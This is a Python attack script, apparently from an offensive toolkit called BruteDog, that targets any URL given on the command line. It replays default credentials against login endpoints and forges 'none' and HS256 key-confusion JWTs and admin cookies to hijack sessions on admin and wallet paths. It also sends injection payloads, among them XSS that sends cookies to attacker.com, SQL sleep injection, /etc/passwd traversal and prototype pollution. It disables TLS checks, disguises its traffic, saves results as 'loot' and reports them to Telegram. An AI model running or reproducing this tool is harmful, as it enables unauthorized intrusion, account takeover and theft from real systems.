#!/usr/bin/env python3
"""
REPLAYER.PY v8.7 — Adaptive Credential Replay, Session Hijacking & Mutation Engine
"""
import asyncio
import base64
import hashlib
import hmac
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from urllib.parse import urlsplit

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

TIMEOUT = 7
USER_AGENT = "BruteDog-AdaptiveReplayer/8.7-Elite-Supremacy"

SSL_CONTEXT = ssl.create_default_context()
SSL_CONTEXT.check_hostname = False
SSL_CONTEXT.verify_mode = ssl.CERT_NONE

CHALLENGE_MARKERS = (
    "<title>security check</title>",
    "cf-browser-verification",
    "attention required!",
    "just a moment...",
    'id="cf-challenge',
    "challenge-platform",
)

_background_tasks: set[asyncio.Task] = set()


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    GRAY = "\033[90m"
    RESET = "\033[0m"


def log(message, color=Colors.RESET):
    print(f"{color}{message}{Colors.RESET}", flush=True)


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Non-blockingly fires Telegram alerts for verified findings."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def normalize_target(target):
    if not target:
        raise ValueError("Target is required.")
    target = target.strip()
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP and HTTPS targets are supported.")
    if not parsed.hostname:
        raise ValueError("Invalid target hostname.")
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"


def _is_challenge_or_html_shell(body: str, headers: dict | None = None) -> bool:
    text = body or ""
    lower = text.lower()
    hdr_lower = str(headers or "").lower()

    if any(m in lower for m in CHALLENGE_MARKERS):
        return True
    if "cf-mitigated" in hdr_lower or "security check" in lower:
        return True

    content_type = ""
    if isinstance(headers, dict):
        for k, v in headers.items():
            if str(k).lower() == "content-type":
                content_type = str(v).lower()
                break

    if "application/json" in content_type or "application/problem+json" in content_type:
        return False

    return (
        '<div id="root">' in lower
        or '<div id="__next">' in lower
        or '<div id="__nuxt">' in lower
        or "<!doctype html>" in lower
        or "<html" in lower
    )


def http_request(url, headers=None, method="GET", data=None, json_payload=None):
    apply_behavioral_jitter()
    request_headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control": "no-cache",
    }
    request_headers.update(get_randomized_hints())
    if headers:
        request_headers.update(headers)

    encoded_data = None
    if json_payload is not None:
        encoded_data = json.dumps(json_payload).encode("utf-8")
        request_headers["Content-Type"] = "application/json"
    elif data:
        if isinstance(data, dict):
            encoded_data = urllib.parse.urlencode(data).encode("utf-8")
            request_headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            encoded_data = str(data).encode("utf-8")

    request = urllib.request.Request(url, data=encoded_data, headers=request_headers, method=method)
    try:
        with urllib.request.urlopen(request, context=SSL_CONTEXT, timeout=TIMEOUT) as response:
            body = response.read(1024 * 1024).decode("utf-8", errors="replace")
            return {
                "status": response.status,
                "body": body,
                "headers": dict(response.headers),
                "final_url": response.geturl(),
                "error": None,
            }
    except urllib.error.HTTPError as exc:
        body = exc.read(1024 * 1024).decode("utf-8", errors="replace")
        return {
            "status": exc.code,
            "body": body,
            "headers": dict(exc.headers),
            "final_url": exc.geturl(),
            "error": None,
        }
    except Exception as exc:
        return {
            "status": 0,
            "body": "",
            "headers": {},
            "final_url": url,
            "error": str(exc),
        }


async def establish_statistical_baseline(base_url):
    """Establishes a baseline response length for anomaly comparison."""
    lengths = []
    for _ in range(2):
        res = await asyncio.to_thread(http_request, f"{base_url}/brutedog_statistical_probe_{int(time.time())}")
        if res["status"] > 0:
            lengths.append(len(res["body"]))
    return (sum(lengths) / len(lengths)) if lengths else 150.0


def forge_advanced_jwt(payload, alg="none", secret=""):
    """Forges test JWT tokens supporting 'none' or HS256 signing."""
    header = {"alg": alg, "typ": "JWT"}
    enc_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    enc_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()

    message = f"{enc_header}.{enc_payload}"
    if alg.lower() == "none":
        return f"{message}."
    if alg.lower() == "hs256":
        signature = hmac.new(secret.encode("utf-8"), message.encode("utf-8"), hashlib.sha256).digest()
        enc_sig = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
        return f"{message}.{enc_sig}"
    return message


async def replay_secondary_attack_queue(target_domain):
    log("\n[***] REPLAYING WEAPONIZED SECONDARY ATTACK QUEUE (V8.7) [***]", Colors.MAGENTA)
    results = []
    queue_path = "reports/intelligence/secondary_attack_queue.json"
    queue_data = []

    if os.path.exists(queue_path):
        try:
            with open(queue_path, "r", encoding="utf-8") as f:
                queue_data = json.load(f)
        except Exception:
            pass

    base_url = normalize_target(target_domain)
    login_endpoints = ["/api/login", "/login", "/api/v1/auth/login", "/auth/login", "/signin", "/api/signin"]

    if not queue_data:
        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor", "administrator:P@ssw0rd123", "system:master"]}]

    baseline_len = await establish_statistical_baseline(base_url)

    for item in queue_data:
        signatures = item.get("matches", [])
        for sig in signatures:
            for endpoint in login_endpoints:
                url = base_url + endpoint
                log(f"[*] Replaying credential vector against {endpoint}...", Colors.BLUE)

                if isinstance(sig, str) and ":" in sig:
                    parts = sig.split(":", 1)
                    payload = {"username": parts[0], "password": parts[1]}
                else:
                    payload = {"credential": sig}

                response = await asyncio.to_thread(http_request, url, method="POST", json_payload=payload)
                if response["status"] in (0, 404, 405):
                    response = await asyncio.to_thread(http_request, url, method="POST", data=payload)

                body = response["body"] or ""
                body_len = len(body)
                body_lower = body.lower()
                is_challenge_or_html = _is_challenge_or_html_shell(body, response.get("headers"))

                has_auth_markers = any(
                    k in body_lower
                    for k in ('"access_token"', '"auth_token"', '"session_id"', '"authenticated":true', '"token"')
                )

                is_bypass = (
                    response["status"] in (200, 201)
                    and not is_challenge_or_html
                    and has_auth_markers
                    and body_len > baseline_len * 1.2
                )

                results.append({
                    "endpoint": endpoint,
                    "status": response["status"],
                    "bypass": is_bypass,
                    "suppressed": is_challenge_or_html,
                })

                if is_bypass:
                    log(f"\n[***] ADAPTIVE CREDENTIAL REPLAY VERIFIED [{endpoint}] [***]", Colors.RED)
                    log(f"  └── Response Excerpt : {body[:250]}", Colors.GREEN)

                    loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                    loot_payload = {
                        "endpoint": url,
                        "status": response["status"],
                        "payload": str(payload),
                        "integrity_hash": loot_hash,
                        "response_excerpt": body[:400],
                    }
                    broadcast_tg_alert_sync("Elite Credential Replay Success", loot_payload)
                    stream_proof("CREDENTIAL_REPLAY_SUCCESS", endpoint, payload, body[:300], loot_payload)
                    save_session_loot(
                        target=base_url,
                        endpoint=endpoint,
                        finding_type="ELITE_CREDENTIAL_REPLAY_SUCCESS",
                        status=response["status"],
                        headers=response["headers"],
                        body=body,
                        extra_loot=loot_payload,
                    )
                else:
                    reason = "WAF/Challenge/HTML" if is_challenge_or_html else "Filtered/Rejected"
                    log(f"  └── HTTP {response['status']} | Length: {body_len} ({reason})", Colors.GRAY)

    return results


async def replay_hijacked_session(target_domain):
    log("\n[***] EXECUTING SESSION HIJACKING & PROTOCOL VERIFICATION (V8.7) [***]", Colors.CYAN)
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as exc:
        log(f"[!] {exc}", Colors.RED)
        return results

    admin_claims = {"sub": "admin", "role": "admin", "isAdmin": True, "permissions": ["all"]}
    none_jwt = forge_advanced_jwt(admin_claims, alg="none")
    hs256_jwt = forge_advanced_jwt(admin_claims, alg="hs256", secret="MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...")

    hijack_vectors = [
        {"name": "Admin Cookie Jar", "cookie": "session=admin; role=admin; authenticated=true; user=admin; isAdmin=true"},
        {"name": "Advanced JWT (None Alg)", "header": {"Authorization": f"Bearer {none_jwt}"}},
        {"name": "Advanced JWT (HS256 Key Confusion)", "header": {"Authorization": f"Bearer {hs256_jwt}"}},
        {"name": "Method Override Admin Bypass", "header": {"X-HTTP-Method-Override": "GET", "X-Original-URL": "/admin"}, "cookie": "role=admin"},
    ]

    protected_paths = ["/dashboard", "/admin", "/account", "/profile", "/api/admin", "/api/user/wallet", "/settings"]

    for vector in hijack_vectors:
        headers = dict(vector.get("header", {}))
        if "cookie" in vector:
            headers["Cookie"] = vector["cookie"]

        for path in protected_paths:
            url = base_url + path
            log(f"[*] Testing Vector [{vector['name']}] on {path}", Colors.BLUE)

            response = await asyncio.to_thread(http_request, url, headers=headers)
            body = response["body"] or ""
            body_lower = body.lower()
            is_challenge_or_html = _is_challenge_or_html_shell(body, response.get("headers"))

            is_success = (
                response["status"] in (200, 201)
                and not is_challenge_or_html
                and any(k in body_lower for k in ('"balance"', '"wallet"', '"role":"admin"', '"transactions"'))
            )

            results.append({
                "vector": vector["name"],
                "endpoint": path,
                "status": response["status"],
                "success": is_success,
                "suppressed": is_challenge_or_html,
            })

            if is_success:
                log(f"\n[***] PRIVILEGE ESCALATION & SESSION HIJACK VERIFIED [{path}] [***]", Colors.RED)
                log(f"  └── Vector : {vector['name']}", Colors.GREEN)

                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                loot_payload = {
                    "vector": vector["name"],
                    "endpoint": url,
                    "status": response["status"],
                    "integrity_hash": loot_hash,
                    "response_excerpt": body[:300],
                }
                broadcast_tg_alert_sync(f"Advanced Session Hijack ({vector['name']})", loot_payload)
                stream_proof("REPLAY_SESSION_HIJACK", path, {"vector": vector["name"]}, body[:300], loot_payload)
                save_session_loot(
                    target=base_url,
                    endpoint=path,
                    finding_type="ADVANCED_SESSION_HIJACK_SUCCESS",
                    status=response["status"],
                    headers=response["headers"],
                    body=body,
                    extra_loot=loot_payload,
                )
            else:
                reason = "WAF/Challenge/HTML" if is_challenge_or_html else "Secured/Blocked"
                log(f"  └── {path} | HTTP {response['status']} ({reason})", Colors.GRAY)

    return results


async def test_injection_reflection(target_domain):
    log("\n[***] POLYMORPHIC PAYLOAD MUTATION & PROTOTYPE POLLUTION CHECK [***]", Colors.CYAN)
    results = []
    try:
        base_url = normalize_target(target_domain)
    except ValueError as exc:
        log(f"[!] {exc}", Colors.RED)
        return results

    advanced_mutations = [
        "<script>fetch('http://attacker.com/'+document.cookie)</script>",
        "'; SLEEP(5); -- -",
        "../../../../etc/passwd",
        {"__proto__": {"isAdmin": True, "role": "admin"}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"$ne": None},
    ]

    for path in ["/", "/search", "/api/search", "/api/v1/users"]:
        for payload in advanced_mutations:
            if isinstance(payload, dict):
                response = await asyncio.to_thread(http_request, f"{base_url}{path}", method="POST", json_payload=payload)
                body = response["body"] or ""
                is_challenge_or_html = _is_challenge_or_html_shell(body, response.get("headers"))
                reflected = (
                    response["status"] in (200, 201)
                    and not is_challenge_or_html
                    and any(k in body.lower() for k in ('"isadmin":true', '"role":"admin"', '"success":true'))
                )
                payload_str = json.dumps(payload)
            else:
                query = urllib.parse.urlencode({"q": payload, "input": payload, "search": payload})
                response = await asyncio.to_thread(http_request, f"{base_url}{path}?{query}")
                body = response["body"] or ""
                is_challenge_or_html = _is_challenge_or_html_shell(body, response.get("headers"))
                reflected = response["status"] != 0 and not is_challenge_or_html and (str(payload) in body)
                payload_str = str(payload)

            if reflected:
                log(f"\n[***] POLYMORPHIC VULNERABILITY VERIFIED [{path}] [***]", Colors.RED)
                log(f"  └── Payload : {payload_str[:60]}", Colors.GREEN)

                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                loot_payload = {
                    "endpoint": path,
                    "payload": payload_str,
                    "status": response["status"],
                    "integrity_hash": loot_hash,
                }
                broadcast_tg_alert_sync("Polymorphic Vulnerability Confirmed", loot_payload)
                stream_proof("POLYMORPHIC_MUTATION", path, {"payload": payload_str}, body[:300], loot_payload)
                save_session_loot(
                    target=base_url,
                    endpoint=path,
                    finding_type="POLYMORPHIC_MUTATION_SUCCESS",
                    status=response["status"],
                    headers=response["headers"],
                    body=body,
                    extra_loot=loot_payload,
                )

            results.append({
                "endpoint": path,
                "payload": payload_str,
                "vulnerable": reflected,
                "suppressed": is_challenge_or_html,
            })

    return results


async def replay_and_inject_payloads(target_host, session_file_path=None):
    start_time = time.time()
    log("\n============================================================", Colors.CYAN)
    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE (V8.7 SUPREMACY) [***]", Colors.CYAN)
    log("============================================================", Colors.CYAN)

    try:
        base_url = normalize_target(target_host)
    except ValueError as exc:
        log(f"[!] Invalid target: {exc}", Colors.RED)
        return {"target": target_host, "success": False, "error": str(error)}

    log(f"[*] Target: {base_url}", Colors.BLUE)

    queue_results = await replay_secondary_attack_queue(base_url)
    session_results = await replay_hijacked_session(base_url)
    injection_results = await test_injection_reflection(base_url)

    duration = round(time.time() - start_time, 2)
    log("\n================ FINAL ASSAULT SUMMARY ================", Colors.CYAN)
    log(f"Credential replays executed: {len(queue_results)}", Colors.GREEN)
    log(f"Session hijacking vectors tested: {len(session_results)}", Colors.GREEN)
    log(f"Polymorphic mutation payloads tested: {len(injection_results)}", Colors.GREEN)
    log(f"Duration: {duration}s", Colors.BLUE)
    log("========================================================", Colors.CYAN)

    return {
        "target": base_url,
        "duration_seconds": duration,
        "credential_replay": queue_results,
        "session_tests": session_results,
        "injection_tests": injection_results,
    }


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 replayer.py <target_url>")
        sys.exit(1)
    asyncio.run(replay_and_inject_payloads(sys.argv[1]))
